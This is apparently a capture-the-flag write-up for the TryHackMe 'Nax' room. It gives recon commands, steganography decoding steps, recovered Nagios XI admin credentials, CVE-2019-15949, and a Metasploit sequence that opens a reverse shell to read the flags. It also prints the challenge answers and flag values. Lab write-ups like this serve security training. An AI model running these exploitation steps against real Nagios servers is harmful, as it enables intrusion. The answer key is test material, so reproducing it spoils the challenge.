# <div align="center">[Nax](https://tryhackme.com/r/room/nax)</div>
<div align="center">Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows an user authenticated execute remote code execution.</div><br>

<div align="center">
<img src="https://github.com/user-attachments/assets/7f2bec20-9377-4463-abf7-12602b548fc3" height="200"></img>
</div>


## Task 1. Flag

Are you able to complete the challenge?

### What hidden file did you find?
```
PI3T.Png
```
* ```nmap -sSCV <IP>```
* ```gobuster dir -u http://<ip>:80/ -w /path-to-wordlist -x txt,php,html```
* ```curl -s http://<IP>```
* ```python3 -c "print(''.join([chr(i) for i in [47, 80, 73, 51, 84, 46, 80, 78, 103]]))"```

### Who is the creator of the file?
```
Piet Mondrian
```
* ```exiftool PI3T.PNg```
### If you get an error running the tool on your downloaded image about an unknown ppm format -- open it with gimp or another paint program and export to ppm format, and try again!
```
No answer needed
```
### What is the username you found?
```
nagiosadmin
```
* ```./npiet /data/tmp/files/PI3T.ppm```
### What is the password you found?
```
n3p3UQ&9BjLp4$7uhWdY
```
### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
```
CVE-2019-15949
```
* ```searchsploit ngios XI -w```
### Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`.
```
No answer needed
```
* ```msfconsole```
* ```search ngios XI```
* ```use 8```
* ```show options```
* ```set LHOST AttackerIP```
* ```set RHOST MachineIP```
* ```set PASSWORD PW```
* ```run```
* ```shell```
* ```cat user.txt```
* ```cat root.txt```
### After Metasploit has started, let's search for our target exploit using the command 'search applicationame'. What is the full path (starting with exploit) for the exploitation module?
```
exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
```
### Compromise the machine and locate user.txt
```
THM{84b17add1d72a9f2e99c33bc568ae0f1}
```
### Locate root.txt
```
THM{c89b2e39c83067503a6508b21ed6e962}
```
